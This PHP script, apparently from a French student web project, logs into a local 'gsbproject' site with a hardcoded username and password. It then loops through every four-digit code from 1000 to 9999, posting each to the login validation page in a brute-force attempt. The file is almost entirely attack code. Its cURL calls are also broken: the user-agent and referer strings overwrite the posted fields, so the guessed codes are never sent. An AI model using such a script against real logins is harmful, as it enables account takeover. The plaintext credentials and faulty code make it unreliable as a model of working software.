<?php
randMPD();
//bruteForce();
//loginmdp();

//include 'vues/v_connexion.php';
function loginmdp(){
$login = "lvillachane";
$mdp = "jux7g";
$postfieldsA["action"] = "submit";
$postfieldsA["login"] = $login;
$postfieldsA["password"] = $mdp;

//url page
$urlA = "http://gsbproject/index.php";
$useragentA = "Chrome";
$refererA = $urlA;

//initialisation cURL
$chA = curl_init($urlA);
//option Curl(?)
curl_setopt($chA, CURLOPT_POST, 1);
//envoi des données du tableau Postfield
curl_setopt($chA, CURLOPT_POSTFIELDS, $postfieldsA);
//useragent pour le navigateur
curl_setopt($chA, CURLOPT_POSTFIELDS, $useragentA);
//on envoie a la bonne page
curl_setopt($chA, CURLOPT_POSTFIELDS, $refererA);
//recuperation du contenu de la page via une chaine
curl_setopt($chA, CURLOPT_RETURNTRANSFER, 1);
//en cas de redirection
curl_setopt($chA, CURLOPT_FOLLOWLOCATION, 1);
//Page de résultats et arret
$resultA = curl_exec($chA);
curl_close($chA);
echo $resultA;
}

function randMPD(){
loginmdp();
$i = 9999;
$a = 1000;
    while($i>0 and $a<9999){
        $a = $a+1;
        bruteForce($a);
        //echo $a."<br>";
        $i--;
    }
}
function bruteForce($rmdp){
//postfield : l'endroit ou l'ont va tester nos codes (aussi un tableau)
$postfields = array();
//envoie le mdp (active le bouton submit)
$postfields["action"] = "submit";
//mot de passe a tester
$postfields["code"] = $rmdp; //9999 $rmdp

//url page
$url = "http://gsbproject/index.php?uc=connexion&action=valideConnexion";
$useragent = "Chrome";
$referer = $url;

//initialisation cURL
$ch = curl_init($url);
//option Curl(?)
curl_setopt($ch, CURLOPT_POST, 1);
//envoi des données du tableau Postfield
curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields);
//useragent pour le navigateur
curl_setopt($ch, CURLOPT_POSTFIELDS, $useragent);
//on envoie a la bonne page
curl_setopt($ch, CURLOPT_POSTFIELDS, $referer);
//recuperation du contenu de la page via une chaine
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//en cas de redirection
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//Page de résultats et arret
$result = curl_exec($ch);
curl_close($ch);
//resultat
echo $result;
}
